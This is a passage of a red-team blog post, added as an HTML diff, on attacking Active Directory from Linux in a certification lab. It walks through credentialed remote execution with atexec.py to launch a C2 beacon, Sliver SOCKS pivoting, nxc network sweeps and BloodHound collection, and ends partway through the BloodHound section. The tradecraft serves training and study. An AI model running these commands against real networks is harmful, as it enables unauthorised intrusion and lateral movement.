@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">The Art of Exploiting Active Directory from Linux | gatari&#39;s blog</title>
+<meta property="og:title" content="The Art of Exploiting Active Directory from Linux | gatari&#39;s blog" />
+<meta name="twitter:title" content="The Art of Exploiting Active Directory from Linux | gatari&#39;s blog" />
+<meta itemprop="name" content="The Art of Exploiting Active Directory from Linux | gatari&#39;s blog" />
+<meta name="application-name" content="The Art of Exploiting Active Directory from Linux | gatari&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="offensive security research">
+<meta itemprop="description" content="offensive security research" />
+<meta property="og:description" content="offensive security research" />
+<meta name="twitter:description" content="offensive security research" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/ad-linux/" title="English" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-09-07T00:00:00Z />
+    <meta property="article:published_time" content=2024-09-07T00:00:00Z />
+    <meta property="og:url" content="http://localhost:1313/posts/ad-linux/" />
+
+    
+    <meta property="og:article:author" content="" />
+    <meta property="article:author" content="" />
+    <meta name="author" content="" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "The Art of Exploiting Active Directory from Linux",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-09-07",
+        "description": "",
+        "wordCount":  3431 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-09-07",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "gatari\u0027s blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.123.8">
+
+    
+    <meta property="og:title" content="The Art of Exploiting Active Directory from Linux" />
+<meta property="og:description" content="Over the past 6 months, I&rsquo;ve been focusing more on the operational side of red teaming and have been actively working at pwning various Active Directory environments and labs. During this time, I finished the Cybernetics prolab and passed the CRTP and CRTE certifications from Altered Security.
+After spending considerable time working with different Command &amp; Control (C2) frameworks, troubleshooting .NET compilation errors, forgetting how to UAC bypass, wrapping commands in PS Credential objects, and dealing with PowerShell Constrained Language Mode (CLM), I’ve come to realize that exploiting AD purely from Windows will cause my life expectancy to decrease significantly." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/ad-linux/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-09-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-09-07T00:00:00+00:00" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="The Art of Exploiting Active Directory from Linux"/>
+<meta name="twitter:description" content="Over the past 6 months, I&rsquo;ve been focusing more on the operational side of red teaming and have been actively working at pwning various Active Directory environments and labs. During this time, I finished the Cybernetics prolab and passed the CRTP and CRTE certifications from Altered Security.
+After spending considerable time working with different Command &amp; Control (C2) frameworks, troubleshooting .NET compilation errors, forgetting how to UAC bypass, wrapping commands in PS Credential objects, and dealing with PowerShell Constrained Language Mode (CLM), I’ve come to realize that exploiting AD purely from Windows will cause my life expectancy to decrease significantly."/>
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/ad-linux/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">The Art of Exploiting Active Directory from Linux</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-09-07T00:00:00&#43;00:00" itemprop="datePublished"> 7 Sep 2024 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>Over the past 6 months, I&rsquo;ve been focusing more on the operational side of red teaming and have been actively working at pwning various Active Directory environments and labs. During this time, I finished the <a href="https://app.hackthebox.com/prolabs/overview/cybernetics">Cybernetics</a> prolab and passed the <a href="https://www.alteredsecurity.com/adlab">CRTP</a> and <a href="https://www.alteredsecurity.com/redteamlab">CRTE</a> certifications from Altered Security.</p>
+<p>After spending considerable time working with different Command &amp; Control (C2) frameworks, troubleshooting .NET compilation errors, forgetting how to UAC bypass, wrapping commands in PS Credential objects, and dealing with PowerShell Constrained Language Mode (CLM), I’ve come to realize that exploiting AD purely from Windows will cause my life expectancy to decrease significantly.</p>
+<p><img alt="wtf" src="https://i.gyazo.com/8a5954d25d69bd68b67d933f83545d3f.png"></p>
+<p>So, that really got me thinking: why do we even perform attacks on Active Directory from Windows?</p>
+<h2 id="overview">Overview</h2>
+<p>Throughout my time working on AD labs and helping out my friends with their labs, I realized something: <strong>Windows is extremely hard to debug</strong>.</p>
+<p>It&rsquo;s hard to Google most errors as they are extremely generic and unique to the particular attack that you&rsquo;re working on, and the error messages are often misleading. Furthermore, commands that I ran may not work for others; and there are many other things to consider, such as:</p>
+<ul>
+<li>Do you currently have a ticket associated with your session? (Kerberos Double Hop Problem)
+<ul>
+<li>If not, do you have credentials to wrap your commands in a PS Credential object?</li>
+</ul>
+</li>
+<li>Are you restricted by PowerShell Constrained Language Mode (CLM)?</li>
+<li>Oh well, surely <code>klist purge</code> actually purges all tickets, right?</li>
+</ul>
+<p><img alt="wtf" src="https://i.gyazo.com/78bd4c004514fa7acd1614cfc651faec.png"></p>
+<p>In this blog post, I&rsquo;ll be going through some of the reasons why I believe that attacking Active Directory from Linux is a better choice than attacking from Windows; and of course some examples of how to do so.</p>
+<h2 id="so-what">So, what?</h2>
+<p>I had this realization that the majority of the time when my friends were having issues, I would direct them to port their ticket(s) to linux and use the tools there with <code>--debug</code>. The errors thrown here are usually much more helpful and easier to google, and not affected by the instability of Windows.</p>
+<blockquote>
+<p>&ldquo;tools&rdquo; refers to the <a href="https://github.com/fortra/impacket">Impacket</a> suite, which is generally stable and well-maintained.</p>
+</blockquote>
+<p>I believe that the majority of the time, you can perform the same attacks on Active Directory from Linux as you would from Windows, but with the added benefit of being able to debug your issues more easily.</p>
+<h2 id="disclaimer">Disclaimer</h2>
+<p>I don&rsquo;t claim that attacking from Linux is the right choice for all scenarios. It is ultimately the responsibility of the operator to decide what tools to use based on the situation at hand.</p>
+<blockquote>
+<p>The examples used in this post were performed in the lab environment generously provided by <a href="https://www.alteredsecurity.com/">Altered Security</a> for the <a href="https://www.alteredsecurity.com/redteamlab">CRTE</a>, I have received written permission to use the screenshots in this post on the condition that I do not disclose any secrets from the lab.</p>
+</blockquote>
+<h2 id="assumed-breach">Assumed Breach</h2>
+<p>In many cases, you may already have a foothold in the network. More often than not, this is a single domain user account and/or workstation that you have compromised. The first few things you might want to do are:</p>
+<ol>
+<li>Identify and Resolve Hosts (especially the Domain Controller)
+<ul>
+<li>specifically populating your <code>/etc/hosts</code> file with the IP addresses of the hosts in the network, we&rsquo;ll understand why later.</li>
+</ul>
+</li>
+<li>Run Bloodhound Collector(s)</li>
+</ol>
+<h3 id="identifying-and-resolving-hosts">Identifying and Resolving Hosts</h3>
+<p>Given a domain account with local administrative privileges on a workstation, we can very easily identify the Domain Controller by pinging the domain name.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ping</span> <span class="p">[</span><span class="no">domain_name</span><span class="p">]</span>
+</span></span></code></pre></div><p><img alt="1" src="https://i.gyazo.com/fc0eaf4baf6935d746ec36ffb91518cf.jpg"></p>
+<p>By doing so, we can easily identify that the domain controller is <code>192.168.1.2</code>; this is in another subnet so we&rsquo;ll need to pivot through the workstation to reach the Domain Controller.</p>
+<h3 id="pivoting-with-sliver">Pivoting with Sliver</h3>
+<p>I won&rsquo;t go into much detail here, but we&rsquo;ll be using Sliver as our C2 framework and pivoting through the workstation using their inband socks proxy.</p>
+<p><img alt="2" src="https://i.gyazo.com/e01808339f119c16fd59d96ea5bd3e74.png"></p>
+<p><img alt="3" src="https://i.gyazo.com/4c9337e70a8288e5c29f5c15d24c5835.png"></p>
+<p>Upon getting our callback, we are an unprivileged user on the workstation. In order to obtain a SYSTEM beacon, we&rsquo;ll need to perform a UAC bypass.</p>
+<p><img alt="4" src="https://i.gyazo.com/b0f32aa9db544bdb558c9dc45f4eb3d2.png"></p>
+<p>But we&rsquo;re lazy, so we can actually just execute beacon from Linux using <a href="https://tools.thehacker.recipes/impacket/examples/atexec.py"><code>atexec.py</code></a> which runs a command using the task scheduler remotely (which runs at the SYSTEM context).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">atexec.py <span class="o">[</span>domain_name<span class="o">]</span>/<span class="o">[</span>username<span class="o">]</span>:<span class="o">[</span>password<span class="o">]</span>@<span class="o">[</span>workstation_ip<span class="o">]</span> <span class="o">[</span>command<span class="o">]</span>
+</span></span></code></pre></div><p><img alt="5" src="https://i.gyazo.com/781c1fac5e026f519406b8d295761ba3.png"></p>
+<p>And now we have a SYSTEM beacon on the workstation.</p>
+<p><img alt="6" src="https://i.gyazo.com/39f0009a5692943ff904d553b5618d6e.png"></p>
+<p>In order to proxy all our commands through the workstation, we&rsquo;ll need to set up an inband socks proxy.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sliver&gt; socks5 start
+</span></span></code></pre></div><blockquote>
+<p>Sliver&rsquo;s inband socks proxy tends to be unstable on some protocols, and listens on the default port of <strong>1081</strong> on the operator&rsquo;s machine; remember to modify your <code>/etc/proxychains4.conf</code> file to reflect this.</p>
+</blockquote>
+<h3 id="resolving-the-domain-controller">Resolving the Domain Controller</h3>
+<p>Now, we can verify that we can interact with the domain controller through <code>proxychains</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains nxc smb <span class="o">[</span>IP/FQDN<span class="o">]</span> -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span>
+</span></span></code></pre></div><p><img alt="7" src="https://i.gyazo.com/91fd5366945f3240229fbbce459736d3.png"></p>
+<h3 id="resolving-other-hosts">Resolving Other Hosts</h3>
+<p>There are a couple ways to resolve the other hosts in the network, the smart and methodical way would be to identify a list of workstations and servers in the network; then resolve them with <code>dig</code>.</p>
+<p>The lazy way would be to resolve them by <code>nxc smb</code> sweeping the network, I&rsquo;ll show both methods here.</p>
+<h4 id="methodical-way-ew">Methodical Way (ew)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains nxc ldap <span class="o">[</span>IP/FQDN<span class="o">]</span> -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> -M get-network -o <span class="nv">ONLY_HOSTS</span><span class="o">=</span><span class="nb">true</span>
+</span></span></code></pre></div><p><img alt="8" src="https://i.gyazo.com/b7629cf5799f33addabd7df0b0d89b11.png"></p>
+<p>This gives you a list of all the hosts in the network</p>
+<p><img alt="9" src="https://i.gyazo.com/4bdcca0d9e982b83438108e97d7c4b9f.png"></p>
+<p>Which you can then resolve with this command, but this takes forever so I wouldn&rsquo;t personally do it this way :)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat <span class="o">[</span>list_of_targets<span class="o">]</span> <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> domain<span class="p">;</span> <span class="k">do</span> proxychains dig @<span class="s2">&#34;[DC_IP]&#34;</span> <span class="s2">&#34;</span><span class="nv">$domain</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">done</span>
+</span></span></code></pre></div><h4 id="lazy-way-yay">Lazy Way (yay)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains nxc smb <span class="o">[</span>IP/FQDN<span class="o">]</span>.0/24 -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> --log <span class="o">[</span>log_file<span class="o">]</span>
+</span></span></code></pre></div><p><img alt="10" src="https://i.gyazo.com/28ebf328ae6d25b20dd12275cef459ef.png"></p>
+<p>Then, we can parse the output to extract the IP addresses &amp; hostnames of the hosts in the network.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">awk <span class="s1">&#39;/SMBv1:False)/{flag=1;next}/SMBv1:True)/{flag=0}flag&#39;</span> sweep.log <span class="p">|</span> awk <span class="s1">&#39;{print $7, $9&#34;.&#34;$11}&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\\.*//&#39;</span>
+</span></span></code></pre></div><blockquote>
+<p>This one-liner is a bit janky, and sometimes bugs out if the output is not expected; please be ready to fix it</p>
+</blockquote>
+<p><img alt="11" src="https://i.gyazo.com/879ff3ead8c3ab79ba790d024ea78f25.png"></p>
+<p>If you&rsquo;re looking really closely, you&rsquo;ll see an anomaly there: <code>192.168.1.56 US-MSSQL.Connection</code>. This is an SQL server, and we can verify this by connecting to it with <code>proxychains nxc mssql [IP/FQDN] -u [username] -p [password]</code>.</p>
+<p><img alt="11" src="https://i.gyazo.com/fff38ed31f6dee4c524497a99b14da4a.png"></p>
+<h2 id="bloodhound">Bloodhound</h2>
+<p>First timers may have a lot of issues when running bloodhound collectors remotely, as it requires a bit of troubleshooting sometimes.</p>
+<h3 id="the-curious-case-of-bloodhound-python">The Curious Case of Bloodhound-Python</h3>
+<p>This is an example of why running tools from Linux is both a blessing and a curse. Let&rsquo;s try running our collector without <code>/etc/hosts</code> populated first, and see what happens.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains bloodhound-python -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> -d <span class="o">[</span>domain<span class="o">]</span> -ns <span class="o">[</span>DC_IP<span class="o">]</span> -c all
+</span></span></code></pre></div><p><img alt="12" src="https://i.gyazo.com/c4610d7579c651153eac53fa753f8254.png"></p>
+<blockquote>
+<p>At first glance, you may assume this error is due to <code>/etc/hosts</code> not being populated, but this error persists even after populating <code>/etc/hosts</code> with the IP addresses of the hosts in the network.</p>
+</blockquote>
+<p>Debugging this issue will require us to take a look at the source code, and start printing out some variables to see what&rsquo;s going on.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  File <span class="s2">&#34;/home/kali/.local/lib/python3.11/site-packages/dns/resolver.py&#34;</span>, line 1321, in resolve
+</span></span><span class="line"><span class="cl">    <span class="nv">timeout</span> <span class="o">=</span> self._compute_timeout<span class="o">(</span>start, lifetime, resolution.errors<span class="o">)</span>
+</span></span></code></pre></div><p>Let&rsquo;s take a look at the source code, and see what&rsquo;s going on.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">query</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">qname</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="n">dns</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="nb">str</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdtype</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="n">dns</span><span class="o">.</span><span class="n">rdatatype</span><span class="o">.</span><span class="n">RdataType</span><span class="p">,</span> <span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">rdatatype</span><span class="o">.</span><span class="n">A</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdclass</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="n">dns</span><span class="o">.</span><span class="n">rdataclass</span><span class="o">.</span><span class="n">RdataClass</span><span class="p">,</span> <span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">rdataclass</span><span class="o">.</span><span class="n">IN</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tcp</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">source</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">raise_on_no_answer</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">source_port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lifetime</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">float</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Answer</span><span class="p">:</span>  <span class="c1"># pragma: no cover</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Query nameservers to find the answer to the question.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    This method calls resolve() with ``search=True``, and is
+</span></span></span><span class="line"><span class="cl"><span class="s2">    provided for backwards compatibility with prior versions of
+</span></span></span><span class="line"><span class="cl"><span class="s2">    dnspython.  See the documentation for the resolve() method for
+</span></span></span><span class="line"><span class="cl"><span class="s2">    further details.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">warnings</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;please use dns.resolver.Resolver.resolve() instead&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="ne">DeprecationWarning</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stacklevel</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[gatari] querying: </span><span class="si">{</span><span class="n">qname</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">rdtype</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">rdclass</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[gatari] using nameserver(s): </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">nameservers</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[gatari] using port: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[gatari] using protocol: </span><span class="si">{</span><span class="s1">&#39;TCP&#39;</span> <span class="k">if</span> <span class="n">tcp</span> <span class="k">else</span> <span class="s1">&#39;UDP&#39;</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[gatari] timeout: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">timeout</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">resolve</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">qname</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rdtype</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rdclass</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tcp</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">source</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">raise_on_no_answer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">source_port</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">lifetime</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span></code></pre></div><p>After adding some debugging statements, let&rsquo;s run the collector again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains bloodhound-python -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> -d <span class="o">[</span>domain<span class="o">]</span> -ns <span class="o">[</span>DC_IP<span class="o">]</span> -c all
+</span></span></code></pre></div><p><img alt="13" src="https://i.gyazo.com/06b2e77337cc5f07da43c9a12bcfef69.png"></p>
+<p>My first thought was that the timeout of <strong>3 seconds</strong> was too short, considering we&rsquo;re running the collector through a socks proxy; which is notoriously slow. So, I increased the timeout to 10 seconds with <code>--dns-timeout 10</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains bloodhound-python -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> -d <span class="o">[</span>domain<span class="o">]</span> -ns <span class="o">[</span>DC_IP<span class="o">]</span> -c all --dns-timeout <span class="m">10</span>
+</span></span></code></pre></div><p><img alt="14" src="https://i.gyazo.com/0617147394a3f0961a90572c0f478cfb.png"></p>
+<p>The error seems to persist, the next thing I noticed was that the query used UDP instead of TCP. Although the Socks5 protocol supports both TCP and UDP, sliver&rsquo;s implementation of some protocols is a bit unstable. Let&rsquo;s flip it to use TCP with <code>--dns-tcp</code> (and remove <code>--dns-timeout 10</code> so that we only test one variable at a time).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains bloodhound-python -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> -d <span class="o">[</span>domain<span class="o">]</span> -ns <span class="o">[</span>DC_IP<span class="o">]</span> -c all --dns-tcp
+</span></span></code></pre></div><p><img alt="15" src="https://i.gyazo.com/1432ad79459a8f8289254dd4979a3c36.png"></p>
+<p>We managed to get past the first query, but we&rsquo;re still getting an error. Thankfully, I&rsquo;ve seen this error appear in a PR on the bloodhound-python repository: <a href="https://github.com/dirkjanm/BloodHound.py/pull/196">https://github.com/dirkjanm/BloodHound.py/pull/196</a></p>
+<p>TLDR: Prepend the domain name with a <code>.</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains bloodhound-python -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> -d <span class="o">[</span>domain<span class="o">]</span>. -ns <span class="o">[</span>DC_IP<span class="o">]</span> -c all --dns-tcp
+</span></span></code></pre></div><p>And, now we finally see an issue related to <code>/etc/hosts</code> not being populated.</p>
+<p><img alt="16" src="https://i.gyazo.com/67007cbb3a7b5e95ad983ebaea265d70.png"></p>
+<p>After populating <code>/etc/hosts</code> with the IP addresses of the hosts in the network, we can finally run the collector successfully.</p>
